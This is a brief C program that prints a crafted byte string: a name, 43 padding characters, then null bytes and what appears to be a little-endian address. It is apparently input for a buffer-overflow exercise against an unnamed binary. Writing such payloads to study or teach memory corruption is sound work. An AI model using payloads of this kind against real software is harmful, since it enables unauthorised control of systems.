#include <stdio.h>

int main(){
	int i;
	fputs("Chris",stdout);
	
	for(i=0;i<43;i++){fputc('a',stdout);}
	
	putchar(0x38);
	
	for(i=0;i<4;i++){putchar(0x00);}
	
	putchar(0xff);
	putchar(0xff);
	putchar(0x0f);
	putchar(0x08);
	putchar('\n');

	return 0;
}
